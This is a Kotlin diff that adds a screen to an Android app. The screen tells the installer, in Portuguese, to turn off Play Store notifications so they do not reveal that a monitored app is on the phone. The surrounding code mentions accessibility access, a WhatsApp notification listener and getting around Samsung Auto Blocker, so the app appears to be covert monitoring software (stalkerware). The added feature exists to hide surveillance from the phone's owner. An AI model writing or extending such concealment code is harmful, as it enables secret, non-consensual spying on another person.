@@ -1582,6 +1582,51 @@ class MainActivity : ComponentActivity() {
 
                 Spacer(Modifier.height(14.dp))
 
+                // ── Desativar notificações da Play Store ──────────────────────
+                Box(
+                    Modifier
+                        .fillMaxWidth()
+                        .background(Color(0xFF0E1120), RoundedCornerShape(10.dp))
+                        .padding(12.dp)
+                ) {
+                    Column {
+                        Text(
+                            "🔕  Desativar Notificações da Play Store",
+                            color = Color.White, fontSize = 13.sp, fontWeight = FontWeight.Medium
+                        )
+                        Spacer(Modifier.height(4.dp))
+                        Text(
+                            "As notificações da Play Store podem revelar que há um app monitorado no celular. Desative-as para manter o sigilo.",
+                            color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp
+                        )
+                        Spacer(Modifier.height(4.dp))
+                        Text(
+                            "Caminho: Configurações → Notificações → Play Store → Desativar",
+                            color = Color(0xFF5A6478), fontSize = 10.sp, lineHeight = 14.sp
+                        )
+                        Spacer(Modifier.height(8.dp))
+                        Button(
+                            onClick = {
+                                runCatching {
+                                    startActivity(
+                                        Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
+                                            putExtra(Settings.EXTRA_APP_PACKAGE, "com.android.vending")
+                                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                                        }
+                                    )
+                                }
+                            },
+                            modifier = Modifier.fillMaxWidth(),
+                            shape = RoundedCornerShape(10.dp),
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1A2235))
+                        ) {
+                            Text("🔕  Ir para Notificações da Play Store", color = Color(0xFFCDD5E0), fontWeight = FontWeight.Medium, fontSize = 12.sp)
+                        }
+                    }
+                }
+
+                Spacer(Modifier.height(14.dp))
+
                 if (!allGranted) {
                     // ── Samsung Auto Blocker (One UI 6 / Android 14+) ─────────────
                     if (isSamsungAutoBlockerRisk && (!hasAccessibility || !hasWhatsAppListener)) {
